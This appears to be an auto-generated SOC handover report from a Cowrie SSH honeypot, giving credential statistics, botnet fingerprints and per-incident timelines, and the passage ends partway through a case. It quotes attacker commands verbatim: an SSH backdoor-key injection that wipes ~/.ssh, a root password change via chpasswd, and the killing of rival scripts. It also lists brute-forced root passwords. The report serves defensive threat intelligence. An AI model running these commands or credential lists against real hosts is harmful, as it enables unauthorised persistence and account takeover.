# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-17 |
| **Generated At** | 2026-05-17T09:50:31Z |
| **Shift Time** | 09:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **659** |
| Confirmed Threats | **652** |
| False Positives Filtered | **7** (1.1%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **16** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **636** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **36** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **5** |
| Unique Passwords | **20** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 23 |
| `345gs5662d34` | 10 |
| `admin` | 1 |
| `orangepi` | 1 |
| `test` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 7 |
| `mkonji` | 2 |
| `admin` | 1 |
| `orangepi` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 7 |
| `root` | `mkonji` | 2 |
| `admin` | `admin` | 1 |
| `orangepi` | `orangepi` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `q1` | `103.237.144.204` | 2026-05-17T07:25:17 |
| `root` | `3245gs5662d34` | `103.237.144.204` | 2026-05-17T07:25:21 |
| `root` | `gitlab123` | `58.20.236.52` | 2026-05-17T07:25:39 |
| `root` | `oracle9i` | `87.106.35.227` | 2026-05-17T07:45:16 |
| `root` | `3245gs5662d34` | `87.106.35.227` | 2026-05-17T07:45:21 |
| `root` | `!@#$%^&` | `111.238.174.6` | 2026-05-17T07:45:41 |
| `root` | `3245gs5662d34` | `111.238.174.6` | 2026-05-17T07:45:45 |
| `root` | `happyme` | `47.251.191.203` | 2026-05-17T07:51:04 |
| `root` | `3245gs5662d34` | `47.251.191.203` | 2026-05-17T07:51:11 |
| `root` | `Admin123456@` | `101.96.202.48` | 2026-05-17T08:19:33 |
| `root` | `3245gs5662d34` | `101.96.202.48` | 2026-05-17T08:19:36 |
| `root` | `Qaz147369` | `101.96.202.48` | 2026-05-17T08:29:30 |
| `root` | `Hello@123` | `163.7.3.26` | 2026-05-17T08:42:38 |
| `root` | `3245gs5662d34` | `163.7.3.26` | 2026-05-17T08:42:41 |
| `root` | `Lhx123456` | `43.153.93.68` | 2026-05-17T08:44:59 |
| `root` | `3245gs5662d34` | `43.153.93.68` | 2026-05-17T08:45:05 |
| `root` | `cum` | `218.78.46.81` | 2026-05-17T08:59:18 |
| `root` | `mkonji` | `118.122.147.49` | 2026-05-17T09:05:14 |
| `root` | `andre123` | `118.122.147.49` | 2026-05-17T09:08:30 |
| `root` | `Password2019` | `118.122.147.49` | 2026-05-17T09:12:50 |
| `root` | `marion` | `118.122.147.49` | 2026-05-17T09:15:48 |
| `root` | `engineering` | `118.122.147.49` | 2026-05-17T09:19:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **659** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 118 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 69 | 6 |
| `03a80b21afa8...` | Modern SSH client | 26 | 4 |
| `af8223ac9914...` | libssh-based | 19 | 3 |
| `19532158b559...` | Mirai/variant | 2 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 69 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 26 | 4 | Modern SSH client |
| `af8223ac9914...` | libssh | 19 | 3 | libssh-based |
| `19532158b559...` | libssh | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 4 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:j4vMEOJuz96X"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `218.78.46.81`, `118.122.147.49`, `101.96.202.48`, `58.20.236.52`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `111.238.174.6`, `103.237.144.204`, `47.251.191.203`, `43.153.93.68`, `87.106.35.227`, `163.7.3.26`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **31** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 2 | HIGH |
| `AS58461` | CT HangZhou IDC | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS10796` | Charter Communications Inc | 1 | HIGH |
| `AS44395` | Ucom CJSC | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-44600cd5579d

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-05-17 07:25 |
| **Last Seen** | 2026-05-17 07:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:25:16` | `cowrie.session.connect` |
| `2026-05-17 07:25:16` | `cowrie.client.version` |
| `2026-05-17 07:25:16` | `cowrie.client.kex` |
| `2026-05-17 07:25:17` | `cowrie.login.success` |
| `2026-05-17 07:25:17` | `cowrie.session.params` |
| `2026-05-17 07:25:17` | `cowrie.command.input` |
| `2026-05-17 07:25:17` | `cowrie.command.failed` |
| `2026-05-17 07:25:18` | `cowrie.log.closed` |
| `2026-05-17 07:25:18` | `cowrie.session.params` |
| `2026-05-17 07:25:18` | `cowrie.command.input` |
| `2026-05-17 07:25:18` | `cowrie.session.file_download` |
| `2026-05-17 07:25:18` | `cowrie.log.closed` |
| `2026-05-17 07:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e47aa461aa

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-05-17 07:25 |
| **Last Seen** | 2026-05-17 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:25:20` | `cowrie.session.connect` |
| `2026-05-17 07:25:20` | `cowrie.client.version` |
| `2026-05-17 07:25:20` | `cowrie.client.kex` |
| `2026-05-17 07:25:21` | `cowrie.login.success` |
| `2026-05-17 07:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d4dd5b2506

| Field | Detail |
|---|---|
| **Source IP** | `58.20.236[.]52` |
| **First Seen** | 2026-05-17 07:25 |
| **Last Seen** | 2026-05-17 07:26 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:j4vMEOJuz96X"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:25:38` | `cowrie.session.connect` |
| `2026-05-17 07:25:38` | `cowrie.client.version` |
| `2026-05-17 07:25:39` | `cowrie.client.kex` |
| `2026-05-17 07:25:39` | `cowrie.login.success` |
| `2026-05-17 07:25:39` | `cowrie.session.params` |
| `2026-05-17 07:25:39` | `cowrie.command.input` |
| `2026-05-17 07:25:39` | `cowrie.command.failed` |
| `2026-05-17 07:25:39` | `cowrie.log.closed` |
| `2026-05-17 07:25:40` | `cowrie.session.params` |
| `2026-05-17 07:25:40` | `cowrie.command.input` |
| `2026-05-17 07:25:40` | `cowrie.session.file_download` |
| `2026-05-17 07:25:40` | `cowrie.log.closed` |
| `2026-05-17 07:25:56` | `cowrie.session.params` |
| `2026-05-17 07:25:56` | `cowrie.command.input` |
| `2026-05-17 07:25:56` | `cowrie.log.closed` |
| `2026-05-17 07:25:56` | `cowrie.session.params` |
| `2026-05-17 07:25:56` | `cowrie.command.input` |
| `2026-05-17 07:25:57` | `cowrie.log.closed` |
| `2026-05-17 07:25:57` | `cowrie.session.params` |
| `2026-05-17 07:25:57` | `cowrie.command.input` |
| `2026-05-17 07:25:57` | `cowrie.session.file_download` |
| `2026-05-17 07:25:57` | `cowrie.log.closed` |
| `2026-05-17 07:25:57` | `cowrie.session.params` |
| `2026-05-17 07:25:57` | `cowrie.command.input` |
| `2026-05-17 07:25:57` | `cowrie.log.closed` |
| `2026-05-17 07:25:58` | `cowrie.session.params` |
| `2026-05-17 07:25:58` | `cowrie.command.input` |
| `2026-05-17 07:25:58` | `cowrie.log.closed` |
| `2026-05-17 07:25:58` | `cowrie.session.params` |
| `2026-05-17 07:25:58` | `cowrie.command.input` |
| `2026-05-17 07:25:58` | `cowrie.command.input` |
| `2026-05-17 07:25:58` | `cowrie.log.closed` |
| `2026-05-17 07:25:59` | `cowrie.session.params` |
| `2026-05-17 07:25:59` | `cowrie.command.input` |
| `2026-05-17 07:25:59` | `cowrie.log.closed` |
| `2026-05-17 07:25:59` | `cowrie.session.params` |
| `2026-05-17 07:25:59` | `cowrie.command.input` |
| `2026-05-17 07:25:59` | `cowrie.log.closed` |
| `2026-05-17 07:25:59` | `cowrie.session.params` |
| `2026-05-17 07:25:59` | `cowrie.command.input` |
| `2026-05-17 07:25:59` | `cowrie.log.closed` |
| `2026-05-17 07:26:00` | `cowrie.session.params` |
| `2026-05-17 07:26:00` | `cowrie.command.input` |
| `2026-05-17 07:26:00` | `cowrie.log.closed` |
| `2026-05-17 07:26:00` | `cowrie.session.params` |
| `2026-05-17 07:26:00` | `cowrie.command.input` |
| `2026-05-17 07:26:00` | `cowrie.log.closed` |
| `2026-05-17 07:26:01` | `cowrie.session.params` |
| `2026-05-17 07:26:01` | `cowrie.command.input` |
| `2026-05-17 07:26:01` | `cowrie.log.closed` |
| `2026-05-17 07:26:01` | `cowrie.session.params` |
| `2026-05-17 07:26:01` | `cowrie.command.input` |
| `2026-05-17 07:26:01` | `cowrie.log.closed` |
| `2026-05-17 07:26:01` | `cowrie.session.params` |
| `2026-05-17 07:26:01` | `cowrie.command.input` |
| `2026-05-17 07:26:01` | `cowrie.log.closed` |
| `2026-05-17 07:26:02` | `cowrie.session.params` |
| `2026-05-17 07:26:02` | `cowrie.command.input` |
| `2026-05-17 07:26:02` | `cowrie.log.closed` |
| `2026-05-17 07:26:02` | `cowrie.session.params` |
| `2026-05-17 07:26:02` | `cowrie.command.input` |
| `2026-05-17 07:26:02` | `cowrie.log.closed` |
| `2026-05-17 07:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.20.236[.]52` to AbuseIPDB if not already reported
- [ ] Block `58.20.236[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acb304ca80a9

| Field | Detail |
|---|---|
| **Source IP** | `87.106.35[.]227` |
| **First Seen** | 2026-05-17 07:45 |
| **Last Seen** | 2026-05-17 07:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:45:15` | `cowrie.session.connect` |
| `2026-05-17 07:45:15` | `cowrie.client.version` |
| `2026-05-17 07:45:15` | `cowrie.client.kex` |
| `2026-05-17 07:45:16` | `cowrie.login.success` |
| `2026-05-17 07:45:16` | `cowrie.session.params` |
| `2026-05-17 07:45:16` | `cowrie.command.input` |
| `2026-05-17 07:45:16` | `cowrie.command.failed` |
| `2026-05-17 07:45:17` | `cowrie.log.closed` |
| `2026-05-17 07:45:17` | `cowrie.session.params` |
| `2026-05-17 07:45:17` | `cowrie.command.input` |
| `2026-05-17 07:45:17` | `cowrie.session.file_download` |
| `2026-05-17 07:45:17` | `cowrie.log.closed` |
| `2026-05-17 07:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.35[.]227` to AbuseIPDB if not already reported
- [ ] Block `87.106.35[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-240051cbc3e0

| Field | Detail |
|---|---|
| **Source IP** | `87.106.35[.]227` |
| **First Seen** | 2026-05-17 07:45 |
| **Last Seen** | 2026-05-17 07:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:45:20` | `cowrie.session.connect` |
| `2026-05-17 07:45:20` | `cowrie.client.version` |
| `2026-05-17 07:45:20` | `cowrie.client.kex` |
| `2026-05-17 07:45:21` | `cowrie.login.success` |
| `2026-05-17 07:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.35[.]227` to AbuseIPDB if not already reported
- [ ] Block `87.106.35[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc8666e7bb45

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-05-17 07:45 |
| **Last Seen** | 2026-05-17 07:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:45:41` | `cowrie.session.connect` |
| `2026-05-17 07:45:41` | `cowrie.client.version` |
| `2026-05-17 07:45:41` | `cowrie.client.kex` |
| `2026-05-17 07:45:41` | `cowrie.login.success` |
| `2026-05-17 07:45:42` | `cowrie.session.params` |
| `2026-05-17 07:45:42` | `cowrie.command.input` |
| `2026-05-17 07:45:42` | `cowrie.command.failed` |
| `2026-05-17 07:45:42` | `cowrie.log.closed` |
| `2026-05-17 07:45:42` | `cowrie.session.params` |
| `2026-05-17 07:45:42` | `cowrie.command.input` |
| `2026-05-17 07:45:42` | `cowrie.session.file_download` |
| `2026-05-17 07:45:42` | `cowrie.log.closed` |
| `2026-05-17 07:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb0effa9e775

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-05-17 07:45 |
| **Last Seen** | 2026-05-17 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:45:44` | `cowrie.session.connect` |
| `2026-05-17 07:45:44` | `cowrie.client.version` |
| `2026-05-17 07:45:45` | `cowrie.client.kex` |
| `2026-05-17 07:45:45` | `cowrie.login.success` |
| `2026-05-17 07:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f570b9fc2f4a

| Field | Detail |
|---|---|
| **Source IP** | `47.251.191[.]203` |
| **First Seen** | 2026-05-17 07:51 |
| **Last Seen** | 2026-05-17 07:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:51:03` | `cowrie.session.connect` |
| `2026-05-17 07:51:03` | `cowrie.client.version` |
| `2026-05-17 07:51:03` | `cowrie.client.kex` |
| `2026-05-17 07:51:04` | `cowrie.login.success` |
| `2026-05-17 07:51:05` | `cowrie.session.params` |
| `2026-05-17 07:51:05` | `cowrie.command.input` |
| `2026-05-17 07:51:05` | `cowrie.command.failed` |
| `2026-05-17 07:51:05` | `cowrie.log.closed` |
| `2026-05-17 07:51:06` | `cowrie.session.params` |
| `2026-05-17 07:51:06` | `cowrie.command.input` |
| `2026-05-17 07:51:06` | `cowrie.session.file_download` |
| `2026-05-17 07:51:06` | `cowrie.log.closed` |
| `2026-05-17 07:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.191[.]203` to AbuseIPDB if not already reported
- [ ] Block `47.251.191[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa3f5138623

| Field | Detail |
|---|---|
| **Source IP** | `47.251.191[.]203` |
| **First Seen** | 2026-05-17 07:51 |
| **Last Seen** | 2026-05-17 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 07:51:09` | `cowrie.session.connect` |
| `2026-05-17 07:51:09` | `cowrie.client.version` |
| `2026-05-17 07:51:10` | `cowrie.client.kex` |
| `2026-05-17 07:51:11` | `cowrie.login.success` |
| `2026-05-17 07:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.191[.]203` to AbuseIPDB if not already reported
- [ ] Block `47.251.191[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b90c2f4d12

| Field | Detail |
|---|---|
| **Source IP** | `101.96.202[.]48` |
| **First Seen** | 2026-05-17 08:19 |
| **Last Seen** | 2026-05-17 08:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
